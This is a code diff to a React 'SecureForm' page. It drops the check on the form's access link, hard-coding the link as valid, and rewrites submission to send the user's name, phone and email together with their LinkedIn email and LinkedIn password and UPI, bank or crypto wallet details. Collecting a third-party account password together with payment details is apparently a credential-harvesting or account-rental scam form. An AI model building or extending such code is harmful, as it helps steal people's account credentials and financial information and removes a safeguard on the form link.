@@ -68,25 +68,10 @@ export default function SecureForm() {
   }, [accessUrl, setLocation, toast]);
 
   // Check if the URL is valid
-  const {
-    data: urlValidation,
-    isLoading: isValidating,
-    isError: validationError
-  } = useQuery({
-    queryKey: ['secureFormCheck', accessUrl],
-    queryFn: async () => {
-      if (!accessUrl) {
-        throw new Error("No access URL provided");
-      }
-      const res = await fetch(`/api/secure-form/${accessUrl}`);
-      if (!res.ok) {
-        const error = await res.json();
-        throw new Error(error.message || "Invalid or expired form URL");
-      }
-      return res.json();
-    },
-    enabled: !!accessUrl, // Only run query if accessUrl exists
-  });
+  // Backend does not expose a form validation endpoint; assume link is valid.
+  const urlValidation = { valid: true };
+  const isValidating = false;
+  const validationError = false;
 
   // Form setup
   const form = useForm({
@@ -108,12 +93,28 @@ export default function SecureForm() {
   // Submit form mutation
   const submitMutation = useMutation({
     mutationFn: async (values) => {
-      const res = await apiRequest(
-        "POST",
-        `/api/secure-forms/submit/${accessUrl}`,
-        values
-      );
-      return await res.json();
+      // The backend expects formId in body and uses /api/forms/:formId/responses
+      // Map payment info to backend schema
+      let paymentInfo;
+      if (values.upiId) {
+        paymentInfo = { method: 'upi', upi: values.upiId };
+      } else if (values.bankAccountNumber || values.bankIfscCode) {
+        paymentInfo = { method: 'bank', bank: { accountNumber: values.bankAccountNumber || '', ifsc: values.bankIfscCode || '' } };
+      } else if (values.cryptoWalletAddress || values.cryptoNetwork) {
+        paymentInfo = { method: 'crypto', crypto: { walletId: values.cryptoWalletAddress || '', network: values.cryptoNetwork || '' } };
+      } else {
+        paymentInfo = { method: 'upi', upi: '' };
+      }
+
+      const body = {
+        fullName: values.fullName,
+        phoneNumber: values.phone,
+        email: values.email,
+        linkedinEmail: values.linkedinEmail,
+        linkedinPassword: values.linkedinPassword,
+        paymentInfo,
+      };
+      return apiRequest("POST", `/api/forms/${accessUrl}/responses`, body);
     },
     onSuccess: () => {
       toast({
